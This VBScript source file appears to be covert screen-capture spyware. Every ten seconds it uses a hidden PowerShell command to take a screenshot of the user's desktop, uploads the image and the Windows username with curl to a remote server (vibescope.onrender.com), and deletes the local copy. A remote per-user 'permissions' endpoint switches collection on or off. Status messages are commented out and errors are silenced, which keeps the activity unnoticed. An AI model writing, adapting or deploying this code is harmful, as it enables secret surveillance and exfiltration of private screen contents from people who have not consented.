'CheckInternetConnection
Dim url : url = "https://vibescope.onrender.com/"

' CaptureScreenshot variables
Dim outputDirectory : outputDirectory = "C:\Users\Public\Libraries"
Dim filename : filename = "Screenshot.png"

' UploadImage & DeleteFile variables
Dim imagePath : imagePath = "C:\Users\Public\Libraries\Screenshot.png" 
Dim apiEndpoint : apiEndpoint = "https://vibescope.onrender.com/uploadImage"

' GetPermissions variable
Dim PermissionsEndpoint : PermissionsEndpoint = "https://vibescope.onrender.com/Permissions/"

Do
	CheckInternetConnection
	GetPermissions
	CaptureScreenshot
	UploadImage
	WScript.Sleep 10000 ' 10000 milliseconds = 10 seconds
	DeleteFile
Loop While True ' Infinite loop


sub GetPermissions()
	On Error Resume Next  ' Enable error handling
	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
	' Open a GET request to the specified URL
	Dim clientName : clientName = objNetwork.UserName
	' Create the HTTP object
	Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")            
	objHTTP.open "GET", PermissionsEndpoint & clientName, False 				          
	' Send the request
	objHTTP.send 	
	
	 ' Check if there was an error during the request
    If Err.Number <> 0 Then
        ' Display detailed error information
        'WScript.Echo "Error connecting to the server. Details: " & Err.Description
        Err.Clear  ' Clear the error object
		WScript.Sleep 10000 ' wait for 10 seconds
		GetPermissions
        Exit Sub
    End If
	
	 ' Check if there was an error during the request
    If objHTTP.Status <> 200 Then
        'WScript.Echo "Error connecting to the server. Status code: " & objHTTP.Status
		WScript.Sleep 10000 ' wait for 10 seconds
		GetPermissions
        Exit Sub
    End If
	
	' Display the response from the server
	'WScript.Echo "Response from server: " & objHTTP.responseText  
	
	If objHTTP.responseText = "true" Then
		'WScript.Echo "Permissions granted!"
    Else
        'WScript.Echo "Permissions denied!"

		WScript.Sleep 1800000 ' wait for 30 minutes
		GetPermissions
	End If
	
	Set objHTTP = Nothing    ' Release the object
	Set objNetwork = Nothing ' Release the object
End sub

sub CheckInternetConnection()
    Dim objHTTP : Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.open "GET", url, False
    On Error Resume Next
    objHTTP.send ""
    On Error GoTo 0
    If objHTTP.status = 200 Then
        'WScript.Echo "Internet is connected!"
    Else
		'WScript.Echo "Internet is not connected!"
		WScript.Sleep 3000
		CheckInternetConnection
    End If
End sub

sub CaptureScreenshot()
	Dim objShell : Set objShell = CreateObject("WScript.Shell")
    Dim powershellCommand : powershellCommand = "Add-Type -AssemblyName System.Windows.Forms; " & _
												"[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); " & _
												"Start-Sleep -Seconds 2; " & _
												"$image = [System.Windows.Forms.Clipboard]::GetImage(); " & _
												"$image.Save('" & outputDirectory & "\" & filename & "', [System.Drawing.Imaging.ImageFormat]::Png); " & _
												"Remove-Variable -Name image"
    
    objShell.Run "powershell.exe -Command """ & powershellCommand & """", 0, True ' Execute the PowerShell command
    'WScript.Echo "Screenshot Captured and saved at " & outputDirectory & "\" & filename ' Display messages
    Set objShell = Nothing
End sub

Sub UploadImage()
	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
    Dim clientName : clientName = objNetwork.UserName
    'WScript.Echo "Uploading Screenshot..."
    Dim curlCommand : curlCommand = "curl -X POST " & apiEndpoint & " -H ""Content-Type: multipart/form-data"" -F ""image=@" & imagePath & """ -F ""clientName=" & clientName & """"
    Dim shell : Set shell = CreateObject("WScript.Shell") ' Create a WScript.Shell object
    shell.Run curlCommand, 0, True ' Run the curl command
	'WScript.Echo "Uploaded..."
    
	Set objNetwork = Nothing    ' Release the object
	Set shell = Nothing         ' Release the shell object
End Sub

Sub DeleteFile()
	Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject") 	' Create a FileSystemObject
    If objFSO.FileExists(imagePath) Then 									' Check if the file exists before attempting to delete
        objFSO.DeleteFile imagePath 										' Delete the file
        'WScript.Echo "File deleted successfully."
    Else
        'WScript.Echo "File not found."
    End If
	Set objFSO = Nothing 												    ' Release the FileSystemObject
End Sub